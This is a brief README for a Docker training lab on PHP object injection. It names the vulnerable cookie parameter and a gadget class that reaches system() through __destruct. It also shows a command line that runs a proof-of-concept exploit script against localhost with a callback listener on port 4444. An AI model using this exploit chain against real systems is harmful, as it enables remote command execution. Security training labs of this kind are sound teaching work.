# PHP Object Injection Lab (Docker)

```bash
./labctl.sh up php-poi
```

- URL: http://127.0.0.1:8106/
- Cookie/param: `data`
- Class: `EvilClass` with `command` → `__destruct` → `system`

```bash
python3 ../poc.py 127.0.0.1 8106 127.0.0.1 4444 --param-name data --delivery cookie --pop-chain generic --command ping
```
